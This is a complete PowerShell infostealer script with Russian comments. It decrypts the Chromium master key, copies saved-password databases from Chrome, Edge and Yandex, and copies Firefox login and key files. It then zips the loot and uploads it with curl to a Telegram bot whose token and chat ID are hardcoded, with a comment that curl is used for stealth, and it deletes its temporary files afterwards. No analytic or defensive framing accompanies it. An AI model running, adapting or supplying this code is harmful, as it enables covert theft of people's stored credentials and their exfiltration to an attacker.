# [ Конфигурация Telegram ]
$botToken = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
$chatId   = "806761221"

# [ Инициализация ]
$tempDir = "$env:TEMP\sys_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
$logPath = "$tempDir\report.log"

Add-Type -AssemblyName System.Security

# Функция для дешифровки ключа Chromium
function Get-Key($statePath, $label) {
    if (Test-Path $statePath) {
        try {
            $json = Get-Content $statePath -Raw | ConvertFrom-Json
            $rawKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $encKey = $rawKey[5..($rawKey.Length-1)]
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            $logLine = "[$($label)] Master Key: $([Convert]::ToBase64String($masterKey))"
            Out-File -FilePath $logPath -InputObject $logLine -Append -Encoding UTF8
            return $true
        } catch { return $false }
    }
    return $false
}

# 1. СБОР ДАННЫХ CHROMIUM
$browsers = @(
    @{name="Chrome"; path="Google\Chrome\User Data"},
    @{name="Edge"; path="Microsoft\Edge\User Data"},
    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
    if (Test-Path $userDataPath) {
        $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($file in $foundFiles) {
            $label = "$($b.name)_$($file.Directory.Name)"
            $localState = Join-Path $userDataPath "Local State"
            if (Get-Key $localState $label) {
                Copy-Item $file.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# 2. СБОР ДАННЫХ FIREFOX (Полный комплект: logins + key4 + cert9)
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    $ffProfiles = Get-ChildItem -Path $ffPath -Directory -ErrorAction SilentlyContinue
    foreach ($profile in $ffProfiles) {
        $label = "FF_$($profile.Name)"
        $files = @("logins.json", "key4.db", "cert9.db")
        foreach ($f in $files) {
            $src = Join-Path $profile.FullName $f
            if (Test-Path $src) {
                Copy-Item $src -Destination "$tempDir\$($label)_$f" -Force -ErrorAction SilentlyContinue
            }
        }
        Out-File -FilePath $logPath -InputObject "[$($label)] Profile collected." -Append -Encoding UTF8
    }
}

# 3. УПАКОВКА И ОТПРАВКА В TELEGRAM
if ((Get-ChildItem $tempDir).Count -gt 1) {
    $zipPath = "$env:TEMP\report_$(Get-Random).zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force

    try {
        $caption = "Protocol 81: $($env:COMPUTERNAME) ($($env:USERNAME))"
        # Используем curl.exe для обхода блокировок и скрытности
        # --connect-timeout 10 на случай лагов сети
        & curl.exe --silent --connect-timeout 10 -X POST "https://api.telegram.org/bot$botToken/sendDocument" `
          -F "chat_id=$chatId" `
          -F "document=@$zipPath" `
          -F "caption=$caption" | Out-Null
    } catch {}

    # Очистка архива
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
}

# Финальная очистка временной папки
Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
